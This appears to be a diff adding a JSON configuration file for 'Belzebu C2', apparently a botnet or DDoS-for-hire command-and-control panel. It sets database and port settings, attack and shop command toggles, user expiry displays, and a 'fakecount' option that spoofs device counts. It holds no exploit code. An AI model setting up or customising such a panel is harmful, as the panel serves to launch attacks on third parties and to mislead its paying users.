@@ -1,0 +1,115 @@
+{
+    "key": "YOUR-KEY",
+    "mysql": {
+        "address": "127.0.0.1:3306",
+        "username": "belzebu",
+        "password": "pass123",
+        "table": "belzebu"
+    },
+    "connection": {
+        "server version": "",
+        "port": 666
+    },
+    "webhook": {
+        "enabled": false,
+        "url": ""
+    },
+    "api": {
+        "enabled": true,
+        "port": 999
+    },
+    "fakecount": {
+        "enabled": false,
+        "spoof": false,
+        "port": 32545,
+        "delay": 1,
+        "chance": 50,
+        "minimum": 12000,
+        "maximum": 100000
+    },
+    "branding": {
+        "title": "Belzebu C2 /  User: <<$username>> / My Ongoing: <<$ongoing>>/<<$concurrents>> / Global: <<$allgoing>>/<<$global_concurrents>> / Expiry: <<$expiry>> / Online: <<$onlineusers>>",
+        "prompt": "\u001b[7;38;2;189;18;203m<<$username>>\u001b[7;38;2;195;43;208m@\u001b[7;38;2;202;69;213mb\u001b[7;38;2;208;94;218me\u001b[7;38;2;215;120;223my\u001b[7;38;2;221;145;227mo\u001b[7;38;2;228;171;232mn\u001b[7;38;2;234;196;237md\u001b[0m \u001b[38;2;247;247;247m🎔 \u001b[0m",
+        "assets": {
+            "welcome": "succ",
+            "banner": "succ",
+            "attack": "attack"
+        },
+        "login": {
+            "custom": false,
+            "title": "Welcome to Belzebu CNC",
+            "asset": "login",
+            "getuser": "<<include(user)>>",
+            "getpass": "<<include(pass)>>"
+        },
+        "tos": {
+            "enabled": false,
+            "title": "Belzebu C2 /  User: <<$username>> / My Ongoing: <<$ongoing>>/<<$concurrents>> / Global: <<$allgoing>>/25 / Expiry: <<$expiry>> / Online: <<$onlineusers>>",
+            "asset": "tos",
+            "prompt": "belzebu/tos >",
+            "answer": "i agree"
+        },
+        "otp": {
+            "enabled": false,
+            "title": "[<<$spinner>>] Beyond C2 Otp [<<$spinner>>]",
+            "asset": "otp",
+            "prompt": "codeplz> "
+        },
+        "errors": {
+            "403": "<theme>[ ? ] Type help For All Available Commands</>",
+            "404": "<theme>[ ? ] Type help For All Available Commands</>",
+            "500": "<theme>[ ? ] Type help For All Available Commands</>"
+        },
+        "hardcoded": {
+            "attack": true,
+            "help": false,
+            "chat": true,
+            "methods": false,
+            "tools": true,
+            "devices": true,
+            "theme": true,
+            "key": true,
+            "shop": true
+        },
+        "captcha": {
+            "enabled": false,
+            "title": "[<<$spinner>>] Beyond C2 Captcha [<<$spinner>>]",
+            "prompt": "captcha> ",
+            "asset": "captcha"
+        },
+        "misc": {
+            "lock host": false,
+            "lock timezone": true,
+            "chat cooldown": 5,
+            "idle timeout": 2600,
+            "prompt check": false,
+            "memory assets": false,
+            "spinner": [
+                "<   3",
+                "<-  3",
+                "< - 3",
+                "<  -3"
+            ],
+            "invert gradients": false,
+            "prompt colors": [
+                {
+                    "r": 255,
+                    "g": 255,
+                    "b": 255
+                }
+            ],
+            "gradient": [
+                {
+                    "r": 222,
+                    "g": 3,
+                    "b": 244
+                },
+                {
+                    "r": 0,
+                    "g": 46,
+                    "b": 250
+                }
+            ]
+        }
+    }
+}
